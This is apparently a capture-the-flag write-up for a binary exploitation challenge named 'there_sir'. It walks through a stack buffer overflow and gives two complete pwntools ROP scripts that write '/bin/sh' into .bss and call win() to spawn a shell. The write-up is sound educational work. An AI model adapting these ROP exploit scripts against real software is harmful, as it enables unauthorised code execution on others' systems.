# there\_sir

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Looking at `vuln()` decompiled:

```c
void vuln(void)

{
  undefined buffer [64];
  
  printf("Enter something: ");
  read(0,hurm,16);
  printf("Enter message: ");
  read(0,buffer,1024);
  return;
}
```

We can see a clear Overflow here:

```c
read(0,buffer,1024);
```

There is also a `win()` function:

```c
void win(int param_1,char *param_2)

{
  if (param_1 != 0x539) {
    printf("Nice try hacker");
    exit(0);
  }
  system(param_2);
  return;
}
```

We are required to pass in two arguments, `1337` and `/bin/sh` . But the catch here is that the 2'nd argument is pointer not an integer like 1'st argument. The solution is we need to use the `read()` syscall which has a PLT entry to read `/bin/sh` at a specific address.

```
❯ rabin2 -S chall
[Sections]

nth paddr        size vaddr       vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000318   0x1c 0x00400318   0x1c -r-- PROGBITS    .interp
2   0x00000338   0x30 0x00400338   0x30 -r-- NOTE        .note.gnu.property
3   0x00000368   0x24 0x00400368   0x24 -r-- NOTE        .note.gnu.build-id
4   0x0000038c   0x20 0x0040038c   0x20 -r-- NOTE        .note.ABI-tag
5   0x000003b0   0x28 0x004003b0   0x28 -r-- GNU_HASH    .gnu.hash
6   0x000003d8  0x138 0x004003d8  0x138 -r-- DYNSYM      .dynsym
7   0x00000510   0x82 0x00400510   0x82 -r-- STRTAB      .dynstr
8   0x00000592   0x1a 0x00400592   0x1a -r-- GNU_VERSYM  .gnu.version
9   0x000005b0   0x30 0x004005b0   0x30 -r-- GNU_VERNEED .gnu.version_r
10  0x000005e0   0x60 0x004005e0   0x60 -r-- RELA        .rela.dyn
11  0x00000640   0xc0 0x00400640   0xc0 -r-- RELA        .rela.plt
12  0x00001000   0x1b 0x00401000   0x1b -r-x PROGBITS    .init
13  0x00001020   0x90 0x00401020   0x90 -r-x PROGBITS    .plt
14  0x000010b0   0x80 0x004010b0   0x80 -r-x PROGBITS    .plt.sec
15  0x00001130  0x25a 0x00401130  0x25a -r-x PROGBITS    .text
16  0x0000138c    0xd 0x0040138c    0xd -r-x PROGBITS    .fini
17  0x00002000   0x3f 0x00402000   0x3f -r-- PROGBITS    .rodata
18  0x00002040   0x5c 0x00402040   0x5c -r-- PROGBITS    .eh_frame_hdr
19  0x000020a0  0x140 0x004020a0  0x140 -r-- PROGBITS    .eh_frame
20  0x00002e10    0x8 0x00403e10    0x8 -rw- INIT_ARRAY  .init_array
21  0x00002e18    0x8 0x00403e18    0x8 -rw- FINI_ARRAY  .fini_array
22  0x00002e20  0x1d0 0x00403e20  0x1d0 -rw- DYNAMIC     .dynamic
23  0x00002ff0   0x10 0x00403ff0   0x10 -rw- PROGBITS    .got
24  0x00003000   0x58 0x00404000   0x58 -rw- PROGBITS    .got.plt
25  0x00003058   0x10 0x00404058   0x10 -rw- PROGBITS    .data
26  0x00003068    0x0 0x00404070   0x30 -rw- NOBITS      .bss
27  0x00003068   0x2b 0x00000000   0x2b ---- PROGBITS    .comment
28  0x00003098  0x498 0x00000000  0x498 ---- SYMTAB      .symtab
29  0x00003530  0x276 0x00000000  0x276 ---- STRTAB      .strtab
30  0x000037a6  0x11f 0x00000000  0x11f ---- STRTAB      .shstrtab
```

Using `rabin2` we can see which section we want to tell `read()` to look at, in this case I will choose `.bss` section because it has a lot of space and has RW permissions.

`read()`  takes in 3 arguments:

```
read(fd, dest-memory-address, num-of-bytes)
```

The file descriptor will be `0` (Read from `stdin` ). Other than that we need to make sure it has enough gadgets to pass in 3 arguments.&#x20;

```
❯ ropper --file chall --search "pop"
...
...
[INFO] File: chall
0x00000000004011fd: pop rbp; ret; 
0x0000000000401381: pop rdi; ret; 
0x0000000000401385: pop rdx; ret; 
0x0000000000401383: pop rsi; ret;
```

Perfect, we have the RDI, RSI and RDX gadgets. Now we can build the script

### Manual Script

```python
from pwn import *

elf = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'

io = process()


offset = 72

bss_location = 0x00404070
pop_rdi = 0x401381
pop_rsi = 0x401383
pop_rdx = 0x401385
win_addr = elf.sym['win']

# Find read address
read_plt = elf.plt['read']


payload = flat(
	b'A' * offset,

	pop_rdi,
	0,
	pop_rsi,
	bss_location,
	pop_rdx,
	16,
	read_plt,

	pop_rdi,
	1337,
	pop_rsi,
	bss_location,
	
	win_addr	
)

io.sendlineafter(b"Enter something: ", b"kambing")
io.sendlineafter(b"Enter message: ", payload)

# send "/bin/sh\0" to be written to .bss
io.sendline(b"/bin/sh\x00")
io.interactive()
```

After sending the payload, only then we send the `/bin/sh` string when `read()` is invoked, waiting input from `stdin` . This writes the string to that address.

```
❯ python3 script.py

[+] Starting local process '/home/mfkrypt/bbctf/pwn/there_sir/chall': pid 110461
...
...
[*] Loaded 8 cached gadgets for './chall'
[*] Switching to interactive mode
$ whoami
mfkrypt
$  
```

### Auto Script

We can also do a ROP chain to automatically write the string to that address without manually finding the gadgets, as the ROP function will do that for us

```python
from pwn import *

elf = context.binary = ELF('./chall', checksec=False)
context.log_level = 'debug'

io = process()


offset = 72

bss_location = 0x00404070
pop_rdi = 0x401381
pop_rsi = 0x401383
pop_rdx = 0x401385
win_addr = elf.sym['win']

# Find read address
read_plt = elf.plt['read']



#ROP chain
rop = ROP(elf)
rop.call(read_plt, [0, bss_location, 16])  # Read /bin/sh to .bss
rop.call(win_addr, [0x539, bss_location])   # Call win with args


payload = flat(
    b'A' * offset,    
    rop.chain()       
)

io.sendlineafter(b"Enter something: ", b"kambing")
io.sendlineafter(b"Enter message: ", payload)

# send "/bin/sh\0" to be written to .bss
io.sendline(b"/bin/sh\0")
io.interactive()
```

```
❯ python3 script.py

[+] Starting local process '/home/mfkrypt/bbctf/pwn/there_sir/chall': pid 110461
...
...
[*] Loaded 8 cached gadgets for './chall'
[*] Switching to interactive mode
$ whoami
mfkrypt
$  
```
